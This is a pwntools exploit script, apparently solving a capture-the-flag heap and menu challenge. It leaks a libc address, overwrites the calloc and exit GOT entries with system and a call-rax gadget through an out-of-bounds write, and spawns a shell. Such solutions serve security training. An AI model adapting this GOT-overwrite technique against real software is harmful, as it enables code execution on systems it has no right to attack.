from pwn import * 

context.arch="x86_64"
elf = ELF("../challenge/chall")
def conn():
    if args.LOCAL:
        p = process("./chall")
        return p 
    elif args.REMOTE:
        HOST, PORT = "localhost", 9002
        p = remote(HOST, PORT)
        return p 
    else:
        exit(0)

def add_code(data):
    p.sendlineafter(">> ", str(1))
    p.sendlineafter("Code: ", data)

def view_code(index):
    p.sendlineafter(">> ", str(2))
    p.sendlineafter("Index: ", str(index))
    
def remove_code(index):
    p.sendlineafter(">> ", str(3))
    p.sendlineafter("Index: ", str(index))

def organize_code(codes_num, index, data, shell=False):
    
    p.sendlineafter(">> ", str(4))
    p.sendlineafter("?: ", str(codes_num))
    if shell:
        return 
    p.sendlineafter("change: ", str(index))
    p.sendlineafter("]: ", data)

def main():
    global p 
    p = conn()
    rw_area = 0x404100
    call_rax = 0x401014 
    rop_ret = 0x40101a
    skip_addr = 0x401686
    calloc_got = 0x404048
    exit_got = 0x404068
    add_code(b"A" * 250)
    add_code(b"B" * 250)
    remove_code(0)
    add_code(b"")
    view_code(2)
    libc_leak = p.recvuntil(b"-", drop=True).ljust(8, b"\x00")
    libc_leak = hex(u64(libc_leak)).replace("0x31", "0x")
    libc_leak = int(libc_leak, 16)
    libc_base = libc_leak - 0x1c6b0a
    system = libc_base + 0x30410
    log.info(f"libc leak: {hex(libc_leak)}")
    log.info(f"libc base: {hex(libc_base)}")
    log.info(f"system: {hex(system)}")
    
    #overwriting sh\0\0 in bss 
    organize_code(-1, (rw_area // 4), str(u32('sh\0\0')))
    # ! overwrite calloc@got twice
    # ! lowest bytes first then highest bytes
    organize_code(-1, (exit_got // 4), str(call_rax))
    organize_code(skip_addr, (calloc_got) // 4 , str(system & 0xffffffff))
    organize_code(skip_addr, (calloc_got + 4) // 4, str(system >> 32))
    organize_code(skip_addr, (exit_got // 4), str(rop_ret))
    organize_code(rw_area, 0, str(0), True)
    #gdb.attach(p)
    p.interactive()
    
if __name__ == "__main__":
    main()
    
